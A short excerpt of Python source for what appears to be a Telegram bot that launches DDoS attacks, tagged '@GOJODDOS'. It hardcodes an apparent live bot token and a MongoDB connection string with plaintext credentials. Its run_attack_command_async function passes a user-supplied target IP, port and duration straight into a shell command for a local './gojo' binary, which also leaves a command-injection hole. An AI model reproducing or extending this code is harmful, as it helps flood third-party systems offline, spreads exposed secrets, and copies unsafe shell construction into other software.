...
TOKEN = '7494295158:AAHPWWWOfefrLUA7vGIlQOh2ZM9f5QLnIj4'
ADMIN_USER_ID = 7171342509
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
USERNAME = "@GOJODDOS"  # Immutable username for maximum security
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    process = await asyncio.create_subprocess_shell(f"./gojo {target_ip} {target_port} {duration}")
